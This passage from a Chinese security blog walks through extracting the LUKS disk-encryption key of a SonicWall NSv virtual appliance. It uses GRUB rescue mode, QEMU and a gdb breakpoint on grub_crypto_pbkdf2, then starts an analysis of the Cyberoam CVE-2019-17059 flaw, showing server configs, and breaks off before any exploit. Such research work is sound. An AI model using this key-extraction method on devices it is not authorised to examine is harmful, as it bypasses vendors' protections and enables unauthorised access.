<p>第一个分区存放了 BOOT 相关文件，并有一个 coreos 目录，可能是基于开源项目制作的。在 boot 分区中我们发现虚拟机使用了 GRUB 引导系统启动，GRUB 是一个常见的启动引导程序，它具有命令行功能。根据官方文档，当系统引导失败时会自动进入 GRUB 救援模式，可以执行一些和文件系统相关的操作。</p>
<h4 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h4><p>明确了后续思路，我们还需要知道分区的加密方式是什么。</p>
<p>用 7-zip 解压出其中一个较小的加密分区 OEM.img，然后加载到 16 进制编辑器看到文件开头是 LUKS</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-5.png"
                     
                ></p>
<p>LUKS 是一种磁盘加密标准，nsv 设备使用 LUKS 实现了全盘加密。</p>
<p>网络上存在一些 LUKS 全盘加密的<a class="link"   href="https://www.ajfriesen.com/decrypt-and-mount-luks-volume-in-grub-rescue-mode/" >解密方法<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，可以进入 GRUB 的救援模式命令行并使用 cryptomount 命令&amp;密码解密。但目前还不知道加密密码是什么，需要研究一下 LUKS 的加密逻辑。</p>
<p>既然系统可以正常启动，说明在引导阶段就通过某种方式解密了各个分区。参考分区的加密方式，密码应该被保存在 luks 相关的模块中。</p>
<p>关于 LUKS 解密的具体逻辑可参考它的项目源码，解密关键函数是 grub_crypto_pbkdf2，原型如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">grub_crypto_pbkdf2 (<span class="type">const</span> <span class="keyword">struct</span> gcry_md_spec *md,</span><br><span class="line">		    <span class="type">const</span> <span class="type">grub_uint8_t</span> *P, <span class="type">grub_size_t</span> Plen,</span><br><span class="line">		    <span class="type">const</span> <span class="type">grub_uint8_t</span> *S, <span class="type">grub_size_t</span> Slen,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> c,</span><br><span class="line">		    <span class="type">grub_uint8_t</span> *DK, <span class="type">grub_size_t</span> dkLen)</span><br></pre></td></tr></table></figure></div>

<p>其中第二个参数是用于解密分区的密钥。</p>
<p>在 BOOT 分区搜索正好可以找到 luks.mod 模块，将它解压，然后用 IDA 分析，通过交叉引用找到解密相关代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">grub_real_dprintf(<span class="string">&quot;disk/luks.c&quot;</span>, <span class="number">246LL</span>, <span class="string">&quot;luks&quot;</span>, <span class="string">&quot;Trying keyslot %d\n&quot;</span>, k);</span><br><span class="line">v32 = grub_crypto_pbkdf2(*(a2 + <span class="number">88</span>), a4, v43, v31, <span class="number">32LL</span>, _byteswap_ulong(*(v31 - <span class="number">1</span>)), v51, v38);</span><br></pre></td></tr></table></figure></div>

<p>我们看到解密时会输出 log 信息 “Trying keyslot xx”，而变量 a4 应该就是 key。</p>
<h4 id="提取密钥"><a href="#提取密钥" class="headerlink" title="提取密钥"></a>提取密钥</h4><p>为了解密分区，需要通过某种手段获取模块中的密钥，而密钥又保存在 luks 模块中，所以具体思路是进入 GRUB 命令行，然后加载和解密相关的各个模块，接着利用调试器附加到 luks.mod 上，尝试中断在 grub_crypto_pbkdf2 函数，并提取其参数。</p>
<p>为了能完成上述操作，首先我们需要一种能够在启动虚拟机后从外部修改文件的方式。这一点可利用 qemu-nbd 实现。</p>
<p>其次还要支持调试器，用于调试 luks 相关模块。可以利用 Linux 下虚拟化平台 QEMU&#x2F;KVM 虚拟机实现。</p>
<p><strong>工具配置</strong></p>
<p>安装 qemu-utils 和 KVM &amp; VMM</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-utils</span><br><span class="line">sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager</span><br></pre></td></tr></table></figure></div>

<p><strong>转换镜像</strong></p>
<p>vmware 使用的是 vmdk 虚拟磁盘镜像，为了使用 qemu-nbd 修改镜像，首先要把 vmdk 转换成 qcow2 格式。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f vmdk ./image.vmdk -O qcow2 sonicwall.qcow2</span><br></pre></td></tr></table></figure></div>

<p><strong>配置虚拟机</strong></p>
<p>注：虚拟机需要开启 Intel-VTx 或 AMD-V 支持。</p>
<p>将转换之后的镜像使用 qemu-nbd 挂载到本地</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">sudo modprobe nbd max_part=8    <span class="comment"># 加载 nbd 模块</span></span><br><span class="line">sudo qemu-nbd --connect=/dev/nbd0 ./sonicwall.qcow2    <span class="comment"># 挂载镜像</span></span><br><span class="line">sudo fdisk /dev/nbd0 -l    <span class="comment"># 查看分区信息</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-6.png"
                     
                ></p>
<p>此时已经成功挂载。</p>
<p>然后导入挂载的镜像到 KVM 虚拟机，在 VMM 中添加一个虚拟机，导入现有磁盘映像 -&gt; 存储路径：&#x2F;dev&#x2F;nbd0</p>
<p><strong>配置调试接口</strong></p>
<p>和 vmware 一样，KVM 也支持对虚拟机添加调试接口，在终端输入命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">virsh edit &lt;虚拟机名称&gt;</span><br></pre></td></tr></table></figure></div>

<p>进入命令行模式，随意选择一个编辑器修改配置文件。</p>
<p>修改 &lt;domain type&#x3D;’kvm’&gt; 为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;domain type=&#x27;kvm&#x27;</span><br><span class="line">        xmlns:qemu=&#x27;http://libvirt.org/schemas/domain/qemu/1.0&#x27; &gt;</span><br><span class="line">        &lt;qemu:commandline&gt;</span><br><span class="line">        &lt;qemu:arg value=&#x27;-gdb&#x27;/&gt;</span><br><span class="line">        &lt;qemu:arg value=&#x27;tcp::12345&#x27;/&gt;</span><br><span class="line">        &lt;/qemu:commandline&gt;</span><br></pre></td></tr></table></figure></div>

<p>这样当虚拟机启动之后就可以用 gdb 附加到 localhost:12345 对其进行调试了。</p>
<p><strong>进入救援模式</strong></p>
<p>我们重命名 boot 分区中的一些文件，当 GRUB 引导时就会由于找不到关键文件而进入救援模式。</p>
<p>首先挂载 nbd 中的 BOOT 分区到本地目录。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount /dev/nbd0p1 ./test</span><br></pre></td></tr></table></figure></div>

<p>然后进入 &#x2F;coreos&#x2F;grub 目录，并重命名其中的三个目录</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv i386-pc i386-pc-bak</span><br><span class="line">mv x86_64-efi x86_64-efi-bak</span><br><span class="line">mv x86_64-xen x86_64-xen-bak</span><br><span class="line">sync</span><br><span class="line">sync</span><br></pre></td></tr></table></figure></div>

<p>启动虚拟机，此时系统会自动进入救援模式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-7.png"
                     
                ></p>
<p>这里可用 TAB 键看看有哪些可用的命令。</p>
<p>ls 命令显示分区列表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-8.png"
                     
                ></p>
<p><strong>使用解密功能</strong></p>
<p>解密分区命令为 cryptomount，不过在使用之前需要恢复 BOOT 分区中的目录名。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ./i386-pc-bak i386-pc     </span><br><span class="line">mv x86_64-efi-bak x86_64-efi     </span><br><span class="line">mv x86_64-xen-bak x86_64-xen</span><br><span class="line">sync</span><br><span class="line">sync</span><br></pre></td></tr></table></figure></div>

<p>使用 cryptomount 尝试解密 (hd0,gpt3) 报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-9.png"
                     
                ></p>
<p>这是因为相关模块没加载，需要手动将部分模块加载一遍，经过测试，至少要加载 gcry_rijndael、luks、gcry_sha256 三个模块</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">insmod luks</span><br><span class="line">insmod gcry_rijndael</span><br><span class="line">insmod gcry_sha256</span><br></pre></td></tr></table></figure></div>

<p>然后再对 gpt3 分区进行解密</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cryptomount (hd0,gpt3)</span><br></pre></td></tr></table></figure></div>

<p>这样解密成功，还可以加载 ext2 模块并用 ls 命令查看文件系统结构</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-10.png"
                     
                ></p>
<p><strong>调试 luks 模块</strong></p>
<p>在救援模式下已经成功解密分区，但无法将文件提取出来，所以需要调试 LUKS 模块取得相关密钥，再挂载镜像到普通的 Linux 系统解密。</p>
<p>重新启动虚拟机，然后另开一个终端，启动 gdb，并附加到当前虚拟机</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote 0:12345</span><br><span class="line">continue</span><br></pre></td></tr></table></figure></div>

<p>加载 gcry_rijndael 等模块，之后通过搜索 LUKS.mod 中特殊字符串来定位关键代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 0,0x8000000,&quot;Trying keyslot %d\n&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-14.png"
                     
                ></p>
<p>这里找到两个结果，依次从每个地址附近查找关键代码，例如进行以下搜索</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x /30i 0x7f56fb7 - 0xbf0</span><br></pre></td></tr></table></figure></div>

<p>继续向下找到关键函数开头</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-15.png"
                     
                ></p>
<p>根据指令偏移量找到关键位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-16.png"
                     
                ></p>
<p>这些指令序列和 IDA 对应位置相同</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-17.png"
                     
                ></p>
<p>在 call 指令下断点，然后让系统继续运行，接着在命令行中解密 gpt3 分区，gdb 将会断下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-18.png"
                     
                ></p>
<p>此时 rcx 寄存器值表示密钥的长度，而在 rdx 寄存器指向的地址中就能找到解密分区使用的密钥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-19.png"
                     
                ></p>
<h4 id="解密文件"><a href="#解密文件" class="headerlink" title="解密文件"></a>解密文件</h4><p>我们已经获取解密 gpt3 分区的密钥，接下来可以在本地 Linux 系统中尝试解密分区。</p>
<p>将 vmdk 重新挂载到本地 Linux 系统，并把调试得到的密钥保存到一个文件中，然后执行以下命令尝试解密。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> key_p3 | sudo cryptsetup luksOpen /dev/sdb3 p3    <span class="comment"># 解密分区</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/mapper/p3 of=./part3    <span class="comment"># 某些情况下挂载分区会报错，我们将分区拷贝到  Windows 下解压</span></span><br></pre></td></tr></table></figure></div>

<p>将生成的 part3 分区文件解压即可得到解密后的文件系统</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/nsv-dec-20.png"
                     
                ></p>
<p>同理，对于剩下的几个加密分区也能通过同样的方式实现解密。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a class="link"   href="https://cloud.tencent.com/developer/article/1087439" >qemu-nbd技术分析<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.ajfriesen.com/decrypt-and-mount-luks-volume-in-grub-rescue-mode/" >Decrypt and mount LUKS volume in GRUB rescue mode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://pavelhan.tech/post/2020-07-07-00-Linux%E7%9A%84%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AFLUKS/" >Linux的磁盘加密技术LUKS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>本文未收取稿费</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-17059</title>
    <url>/2021/12/14/CVE-2019-17059/</url>
    <content><![CDATA[<p>2019 年 10 月 1 日，CVE 官方发布了编号为 CVE-2019-17059 的漏洞：Cyberoam 防火墙任意代码执行。本文对此漏洞进行分析。</p>
<span id="more"></span>

<p>漏洞的发现者在 2019 年 10 月 7 日左右发布了关于此漏洞的<a class="link"   href="https://thebestvpn.com/cyberoam-preauth-rce/" >具体信息<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，但文章中隐藏了很多关键细节。</p>
<h2 id="A-数据处理流程"><a href="#A-数据处理流程" class="headerlink" title="A. 数据处理流程"></a>A. 数据处理流程</h2><p>Cyberoam 底层使用一个修改过的 Linux 系统，整体框架设计比较复杂，包含一个 JAVA 编写的前端服务，以及 Embedded perl 编写的后端服务，前后端通过一种自定义的类 HTTP 格式数据进行通信。</p>
<h3 id="A-1-前端"><a href="#A-1-前端" class="headerlink" title="A.1 前端"></a>A.1 前端</h3><p>netstat 查看端口监听情况，发现监听 80 端口的服务启动命令为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache -d /_conf/httpd</span><br></pre></td></tr></table></figure></div>

<p>来到 &#x2F;_conf&#x2F;httpd&#x2F;conf 目录下可以找到 apache 相关配置文件 httpd.conf，其内部会引用子文件：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Include /cfs/web/apache/httpd.conf</span><br></pre></td></tr></table></figure></div>

<p>&#x2F;cfs&#x2F;web&#x2F;apache&#x2F;httpd.conf，内容如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listen 80</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">ServerName manage.cyberoam</span><br><span class="line">&lt;Proxy *&gt;</span><br><span class="line">AddDefaultCharset utf-8</span><br><span class="line">&lt;/Proxy&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule	/WEB-INF/* - [F]</span><br><span class="line">RewriteRule	/properties/* - [F]</span><br><span class="line">RewriteRule ^/$ /corporate/webpages/login.jsp [R=302]</span><br><span class="line">ErrorDocument 500 /error/INTERNAL_SERVER_ERROR.html</span><br><span class="line">ErrorDocument 503 /error/APP_SERVER_NOT_AVAILABLE.html</span><br><span class="line">ErrorDocument 404 /error/FILE_NOT_EXISTS.html</span><br><span class="line">ProxyPass /corporate/images !</span><br><span class="line">ProxyPass /corporate/dg !</span><br><span class="line">ProxyPass /corporate/APIController !</span><br><span class="line">ProxyPass /corporate/iview/images !</span><br><span class="line">ProxyPass /corporate/iview/css !</span><br><span class="line">ProxyPass /corporate/iview/javascript !</span><br><span class="line">ProxyPass /corporate/iview/FusionCharts !</span><br><span class="line">ProxyPass /corporate/iview/graycss !</span><br><span class="line">ProxyPass /corporate/iview/grayimages !</span><br><span class="line">ProxyPass /corporate/iview/defaultcss !</span><br><span class="line">ProxyPass /corporate/iview/defaultimages !</span><br><span class="line">ProxyPass /corporate/iview/lite1css !</span><br><span class="line">ProxyPass /corporate/iview/lite1images !</span><br><span class="line">ProxyPass /corporate/iview/lite2css !</span><br><span class="line">ProxyPass /corporate/iview/lite2images !</span><br><span class="line">ProxyPass /corporate/iview/jqplot !</span><br><span class="line">ProxyPass /corporate http://localhost:8009/corporate</span><br><span class="line">ProxyPassReverse /corporate http://localhost:8009/corporate</span><br><span class="line">ProxyPass /corporate/iview http://localhost:8009/corporate/iview</span><br><span class="line">ProxyPassReverse /corporate/iview http://localhost:8009/corporate/iview</span><br><span class="line">RewriteRule ^/portal(/)?$ - [F]</span><br><span class="line">RewriteRule /corporate/webpages/tportal/* - [F]</span><br><span class="line">ProxyPass /registrationserver http://cyberoamupdate.cyberoam.com/demoregserver/servlet/CyberoamSyncManager retry=0</span><br><span class="line">ProxyPassReverse /registrationserver http://cyberoamupdate.cyberoam.com/demoregserver/servlet/CyberoamSyncManager</span><br><span class="line">ProxyPass /notificationmsg http://cyberoamregistration.cyberoam.com/datetime/notificationmsg.jsp retry=0</span><br><span class="line">ProxyPassReverse /notificationmsg http://cyberoamregistration.cyberoam.com/datetime/notificationmsg.jsp</span><br><span class="line">ProxyPreserveHost On</span><br><span class="line">RewriteEngine   On</span><br><span class="line">Rewritecond  %&#123;request_method&#125; !^(GET|POST)$</span><br><span class="line">RewriteRule .* - [F]</span><br><span class="line">ExpiresActive On</span><br><span class="line">ExpiresDefault &quot;access plus 1 month&quot;</span><br><span class="line">AddOutputFilterByType DEFLATE text/plain</span><br><span class="line">AddOutputFilterByType DEFLATE text/html</span><br><span class="line">AddOutputFilterByType DEFLATE text/css</span><br><span class="line">AddOutputFilterByType DEFLATE application/javascript</span><br><span class="line">AddOutputFilterByType DEFLATE application/x-javascript</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></div>

<p>这里看到监听外部 80 端口的服务配置，当用户访问 &#x2F;corporate 接口时，请求会被转发到 <a class="link"   href="http://localhost:8009/corporate%EF%BC%8Ctomcat" >http://localhost:8009/corporate，tomcat<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 监听此接口，启动命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat -X mx64M -X ms12M -X ss128k -X asyncgc -X noinlining -X replication:none -X compactalways -D java.io.tmpdir=/tmp-Djava.awt.headless=true -D jetty.class.path=/bin/jetty/lib/javax.servlet.jar:/bin/jetty/lib/org.mortbay.jetty.jar:/bin/jetty/webapps/corporate/properties:/bin/jetty/webapps/corporate/jar/jta26.jar:/bin/jetty/webapps/reports/properties -X bootclasspath:/bin/jamvm/share/jamvm/classes:/bin/classpath/share/classpath -D STOP.PORT=-1 -jar /bin/jetty/start.jar /bin/jetty/etc/jetty.xml</span><br></pre></td></tr></table></figure></div>

<p>jetty.xml 部分配置</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Configure</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Mort Bay Consulting//DTD Configure//EN&quot;</span> <span class="string">&quot;http:/&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!-- Configure the Jetty Server                                      --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;Configure class=&quot;</span>org.mortbay.jetty.Server<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Increase Maximum Form Content Size                              --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Call class=&quot;</span>java.lang.System<span class="string">&quot; name=&quot;</span>setProperty<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Arg&gt;org.mortbay.http.HttpRequest.maxFormContentSize&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Arg&gt;4194304&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Call&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  </span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Configure the Request Listeners                                 --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Add and configure a HTTP listener to port 8080                       --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- The default port can be changed using: java -Djetty.port=80     --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Call name=&quot;</span>addListener<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;New class=&quot;</span>org.mortbay.http.SocketListener<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>Port<span class="string">&quot;&gt;&lt;SystemProperty name=&quot;</span>jetty.port<span class="string">&quot; default=&quot;</span>8009<span class="string">&quot;/&gt;&lt;/S&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">		&lt;Set name=&quot;</span>PoolName<span class="string">&quot;&gt;P1&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>MinThreads<span class="string">&quot;&gt;20&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>MaxThreads<span class="string">&quot;&gt;200&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>lowResources<span class="string">&quot;&gt;50&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>MaxIdleTimeMs<span class="string">&quot;&gt;30000&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>LowResourcePersistTimeMs<span class="string">&quot;&gt;2000&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>acceptQueueSize<span class="string">&quot;&gt;0&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>ConfidentialPort<span class="string">&quot;&gt;8443&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">        &lt;Set name=&quot;</span>IntegralPort<span class="string">&quot;&gt;8443&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;/New&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Call&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Set name=&quot;</span>WebApplicationConfigurationClassNames<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Array type=&quot;</span>java.lang.String<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.XMLConfiguration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.JettyWebConfiguration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;!--</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.TagLibConfiguration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Item&gt;org.mortbay.jetty.servlet.jsr77.Configuration&lt;/Item&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;/Array&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Configure the Contexts                                          --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Set name=&quot;</span>rootWebApp<span class="string">&quot;&gt;root&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  </span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Call name=&quot;</span>addWebApplications<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;&lt;SystemProperty name=&quot;</span>jetty.home<span class="string">&quot; default=&quot;</span>.<span class="string">&quot;/&gt;/webapps/&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg&gt;&lt;SystemProperty name=&quot;</span>jetty.home<span class="string">&quot; default=&quot;</span>.<span class="string">&quot;/&gt;/etc/webdefault.xml&lt;/A&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg type=&quot;</span>boolean<span class="string">&quot;&gt;true&lt;/Arg&gt;&lt;!--extract WARs--&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;Arg type=&quot;</span>boolean<span class="string">&quot;&gt;false&lt;/Arg&gt;&lt;!-- java 2 compliant class loader --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Call&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- Configure the Request Log                                       --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;!-- =============================================================== --&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;Set name=&quot;</span>RequestLog<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;New class=&quot;</span>org.mortbay.http.NCSARequestLog<span class="string">&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">	&lt;Arg&gt;&lt;SystemProperty name=&quot;</span>logs<span class="string">&quot; default=&quot;</span>/<span class="string">&quot; /&gt;/log/tomcat.log&lt;/Arg&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>retainDays<span class="string">&quot;&gt;0&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>append<span class="string">&quot;&gt;true&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>extended<span class="string">&quot;&gt;false&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>buffered<span class="string">&quot;&gt;false&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">      &lt;Set name=&quot;</span>LogTimeZone<span class="string">&quot;&gt;GMT&lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">    &lt;/New&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">  &lt;/Set&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;/Configure&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>这里找到 web 目录在 &#x2F;bin&#x2F;jetty&#x2F;webapps&#x2F;corporate&#x2F; 下，web.xml 部分配置</p>
